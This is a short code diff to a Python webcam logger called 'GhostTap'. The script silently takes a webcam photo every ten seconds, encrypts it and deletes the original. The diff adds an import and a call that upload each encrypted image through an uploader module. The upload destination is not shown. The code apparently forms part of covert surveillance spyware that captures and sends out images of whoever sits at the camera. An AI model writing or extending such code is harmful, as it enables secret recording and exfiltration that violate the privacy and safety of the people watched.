@@ -4,6 +4,7 @@ from datetime import datetime
 import os
 from encryptor import encrypt_file
 import uuid
+from uploader import upload_file
 
 def cam_logger():
     cap = cv2.VideoCapture(0)
@@ -18,9 +19,11 @@ def cam_logger():
                 unique_id = uuid.uuid4().hex # unique characters
                 filename = os.path.join(LOG_DIR, f"{unique_id}.jpg")
                 cv2.imwrite(filename, frame) # save image
+                time.sleep(0.1)
                 encrypted_filename = f"{filename}.enc" # add encrypted file
                 encrypt_file(filename, encrypted_filename) # encrypt function
                 os.remove(filename) # remove original .jpg
+                upload_file(encrypted_filename)
                 time.sleep(10) # wait 10 seconds every save
     except KeyboardInterrupt: # ctrl + c interrupt
         print("GhostTap cam_logger stopped.")
